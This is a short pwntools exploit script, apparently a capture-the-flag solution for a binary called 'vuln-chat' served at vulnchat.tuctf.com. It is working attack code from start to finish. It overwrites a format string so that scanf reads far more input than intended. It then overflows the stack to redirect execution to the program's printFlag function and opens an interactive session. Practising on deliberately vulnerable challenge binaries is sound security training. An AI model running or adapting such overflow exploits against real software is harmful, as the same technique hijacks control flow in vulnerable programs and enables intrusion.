from pwn import *
import sys

binary = ELF("./vuln-chat")

if len(sys.argv) == 1:
	p = process("vuln-chat")
else:
	p = remote("vulnchat.tuctf.com", 4141)

print p.recv()

payload = "a"*20
payload += "%99s"
p.sendline(payload)

system = 0x08048430
printflag = 0x0804857B
puts = 0x08048420

print p.recv()
payload = "a"*(0x2d)
payload += p32(0)
payload += p32(binary.symbols['printFlag'])
p.sendline(payload)

p.interactive()
